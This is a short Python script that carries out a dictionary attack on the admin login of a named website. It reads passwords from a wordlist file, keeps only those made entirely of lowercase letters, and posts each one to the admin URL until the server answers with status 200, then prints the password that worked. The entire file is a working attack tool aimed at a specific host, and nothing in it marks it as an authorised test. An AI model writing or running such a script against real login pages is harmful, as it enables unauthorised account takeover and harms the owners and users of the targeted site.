import requests
from colorama import init, Fore, Back

init(autoreset=True)
url = 'https://blog.ntut.club:2087/admin'

def alpha(password):
    for i in password:
        if (i >= 'a' and i <= 'z'):
            continue
        else:
            return False

    return True

with open('sedb_201900.txt', 'r') as f:
    for password in f.readlines():
        password = password.replace('\n', '')

        if (alpha(password)):
            if (requests.post(url, data={'password':password}).status_code == 200):
                print(Fore.GREEN + password)
                break
            else:
                print(Fore.RED + password)
        else:
            continue